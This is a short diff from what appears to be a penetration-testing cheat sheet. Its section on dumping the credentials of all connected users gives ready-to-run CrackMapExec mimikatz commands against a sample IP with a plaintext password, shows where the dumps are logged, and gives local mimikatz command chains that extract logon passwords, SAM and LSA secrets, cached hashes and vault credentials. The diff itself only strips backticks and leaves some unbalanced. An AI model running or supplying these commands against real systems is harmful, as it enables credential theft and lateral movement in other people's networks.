@@ -46,10 +46,10 @@ Second, detect if the SMB signing is disabled. When SMB signing is disabled, an 
 
 ## Dump the credentials of all connected users, including cached hashes
 Kali
-         `sudo crackmapexec smb -M mimikatz 192.168.1.54 -u ippsec -Password12345`
-         `sudo crackmapexec smb -M mimikatz 192.168.1.54 -u ippsec -Password12345 --server-port 444`
-         stored in (for sudo): `cat /root/.cme/logs/Mimikatz-192.168.1.54.log`
-         stored in (for non-sudo): `cat ~/cme/logs/Mimikatz-192.168.1.54.log`
+         sudo crackmapexec smb -M mimikatz 192.168.1.54 -u ippsec -Password12345
+         sudo crackmapexec smb -M mimikatz 192.168.1.54 -u ippsec -Password12345 --server-port 444
+         stored in (for sudo): `cat /root/.cme/logs/Mimikatz-192.168.1.54.log
+         stored in (for non-sudo): `cat ~/cme/logs/Mimikatz-192.168.1.54.log
 Local
          ./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
          ./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"
